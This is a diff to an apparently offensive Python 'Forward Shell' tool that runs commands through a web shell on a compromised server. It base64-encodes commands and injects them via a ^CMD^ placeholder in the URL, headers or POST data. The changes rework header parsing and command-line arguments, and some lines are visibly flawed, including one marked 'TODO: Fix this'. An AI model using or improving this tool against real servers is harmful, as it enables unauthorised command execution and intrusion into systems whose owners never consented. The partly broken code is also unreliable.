@@ -4,6 +4,7 @@ import requests
 import threading
 import sys
 from base64 import b64encode
+import json
 import random
 import argparse
 from time import sleep
@@ -32,9 +33,9 @@ class WebShell():
     def sendPayload(self, payload):
         b64str = b64encode(bytes(payload,'utf-8') + b'\n').decode()
         payload = f"/usr/bin/echo '{b64str}' | base64 -d > {self.input_name}"
-        
+
         url = self.url.replace("^CMD^", payload)
-        headers = self.headers.replace("^CMD^", payload)
+        headers = self.headers.replace("^CMD^", payload) # TODO: Fix this
         if self.data:
             data = self.data.replace("^CMD^", payload)
             r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
@@ -183,17 +184,15 @@ def main():
 
         session.proxies = proxies
 
-    # Parse headers cmd headers will be added later
+    # Parse input headers and add them to session
     if headers:
         cmd_headers = {}
-        headers = headers.split(",")
         for header in headers:
+            key, value = header.split(":")
             if not "^CMD^" in header:
-                header = header.split(":")
-                session.headers[header[0]] = header[1]
+                session.headers[key] = value.lstrip()
             else:
-                header = header.split(":")
-                cmd_headers[header[0]] = header[1]    
+                cmd_headers[key] = value.lstrip()
 
     if interval:
         interval = float(interval)
@@ -267,7 +266,7 @@ argparser = argparse.ArgumentParser(description='Forward Shell')
 argparser.add_argument('-u', '--url', help='URL to send requests to', required=True)
 argparser.add_argument('-x', '--proxy', help='Proxy to use', required=False)
 argparser.add_argument('-d', '--data', help='Send POST request', required=False)
-argparser.add_argument('-H', '--header', help='Add header to request', required=False)
+argparser.add_argument('-H', '--headers', help='Add header to request', required=False, nargs='*')
 argparser.add_argument('-t', '--interval', help='Interval to check for new output', required=False)
 argparser.add_argument('-k', '--insecure', help='Disable SSL verification', required=False, action='store_true')
 argparser.add_argument('--upgrade-tty', help='Upgrade to a full interactive shell', required=False, action='store_true')
